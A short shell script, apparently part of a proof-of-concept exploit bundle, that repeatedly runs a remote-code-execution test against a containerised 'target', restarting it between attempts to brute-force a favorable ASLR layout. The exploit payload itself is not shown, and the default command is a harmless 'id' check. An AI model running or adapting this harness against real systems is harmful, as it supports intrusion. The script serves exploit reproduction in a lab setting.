#!/bin/sh
set -eu

bundle_dir=$(CDPATH= cd -- "$(dirname "$0")/.." && pwd)
compose="$bundle_dir/scripts/compose-command.sh"
max_attempts=${MAX_ATTEMPTS:-8}
command=${*:-id}

attempt=1
while [ "$attempt" -le "$max_attempts" ]; do
    printf 'RCE attempt %s/%s\n' "$attempt" "$max_attempts"
    if "$bundle_dir/scripts/test.sh" "$command"; then
        exit 0
    fi
    if [ "$attempt" -lt "$max_attempts" ]; then
        "$compose" restart target
        sleep 2
    fi
    attempt=$((attempt + 1))
done

echo "No favorable native ASLR layout after $max_attempts attempts." >&2
exit 1

